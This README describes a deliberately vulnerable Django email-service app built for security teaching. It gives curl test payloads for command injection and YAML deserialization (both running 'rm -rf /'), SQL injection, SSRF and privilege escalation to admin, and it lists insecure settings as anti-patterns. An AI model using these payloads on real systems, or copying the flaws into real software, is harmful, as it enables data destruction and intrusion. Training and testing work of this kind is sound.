# EmailService - Intentionally Vulnerable Django Application

This is an intentionally vulnerable Django 1.8.3 email service application designed for security testing and educational purposes. The application contains several known vulnerabilities that can be exploited to demonstrate various security concepts.

## ⚠️ DISCLAIMER

This application is intentionally vulnerable and should ONLY be used in controlled environments for security testing and educational purposes. Do not deploy this in production or expose it to the internet.

## Features

- Send individual emails
- Send bulk emails
- Send template-based emails
- Email validation
- Email status tracking
- Email template management
- Email logging

## Vulnerabilities

### 1. Command Injection
- **Location**: `send_email` view
- **Vulnerability**: Unsafe use of `os.system()` with user input
- **Test Example**: 
```bash
curl -X POST http://localhost:8000/send -d '{"to":"user@example.com","subject":"test","message":"test","template":"test.txt; rm -rf /"}'
```

### 2. Insecure Deserialization
- **Location**: `send_template_email` view
- **Vulnerability**: Unsafe YAML deserialization
- **Test Example**:
```bash
curl -X POST http://localhost:8000/template -d '!!python/object/apply:os.system ["rm -rf /"]'
```

### 3. Server-Side Request Forgery (SSRF)
- **Location**: `validate_email` view
- **Vulnerability**: Unsafe URL construction and request
- **Test Example**:
```bash
curl -X POST http://localhost:8000/validate -d 'email=user@example.com&url=http://internal-service/'
```

### 4. Template Injection
- **Location**: `send_template_email` view
- **Vulnerability**: Unsafe template string formatting
- **Test Example**:
```bash
curl -X POST http://localhost:8000/template -d '{"to":"user@example.com","template":"test","data":{"name":"{{7*7}}","content":"test"}}'
```

### 5. Missing Authentication
- **Location**: All endpoints
- **Vulnerability**: No authentication checks
- **Test Example**: Any endpoint can be accessed without authentication

### 6. No Rate Limiting
- **Location**: `send_email` and `send_bulk_email` views
- **Vulnerability**: No rate limiting on email sending
- **Test Example**: Send multiple requests in quick succession

### 7. SQL Injection
- **Location**: Multiple views
- **Vulnerability**: Unsafe string formatting in SQL queries
- **Test Examples**:
```bash
# In send_email
curl -X POST http://localhost:8000/send -d '{"to":"user@example.com","subject":"test","message":"test","template":"test\' OR \'1\'=\'1"}'

# In get_email_status
curl http://localhost:8000/status?id=1 OR 1=1

# In search_templates
curl http://localhost:8000/templates/search?q=test\' OR \'1\'=\'1
```

### 8. Unsafe Database Operations
- **Location**: Multiple views
- **Vulnerability**: Direct object reference and unsafe save operations
- **Test Examples**:
```bash
# In manage_user_settings
curl -X POST http://localhost:8000/user/settings -d '{"user_id":1,"settings":{"email":"attacker@example.com","groups":["admin"]}}'

# In update_user_permissions
curl -X POST http://localhost:8000/user/permissions -d '{"user_id":1,"permissions":[{"action":"add","group":"admin"}]}'
```

## Configuration Vulnerabilities

1. **Debug Mode**: Enabled in production
2. **Secret Key**: Hardcoded in settings
3. **CORS**: Overly permissive configuration
4. **CSRF**: Disabled on all endpoints
5. **Django Version**: Using outdated version 1.8.3 with known vulnerabilities

## Setup

1. Install dependencies:
```bash
pip install -r requirements.txt
```

2. Set up environment variables:
```bash
export EMAIL_USER=your-email@gmail.com
export EMAIL_PASSWORD=your-app-password
```

3. Run migrations:
```bash
python manage.py migrate
```

4. Start the server:
```bash
python manage.py runserver
```

## API Endpoints

- `POST /api/email/send` - Send individual email
- `POST /api/email/bulk` - Send bulk emails
- `POST /api/email/template` - Send template-based email
- `GET /api/email/status` - Check email status
- `POST /api/email/validate` - Validate email address
- `POST /api/email/templates/create` - Create new email template
- `GET /api/email/templates/search` - Search email templates

## Security Best Practices (What NOT to do)

This application demonstrates several anti-patterns:

1. Using `os.system()` with user input
2. Using `yaml.load()` instead of `yaml.safe_load()`
3. Disabling CSRF protection
4. No input validation
5. No rate limiting
6. No authentication
7. Hardcoded secrets
8. Debug mode in production
9. Overly permissive CORS
10. Using outdated dependencies
11. Raw SQL queries with string formatting
12. Unsafe database operations
13. No error handling
14. No input sanitization

## Contributing

This is a demo application for security testing. Feel free to add more vulnerabilities or improve the existing ones for educational purposes. 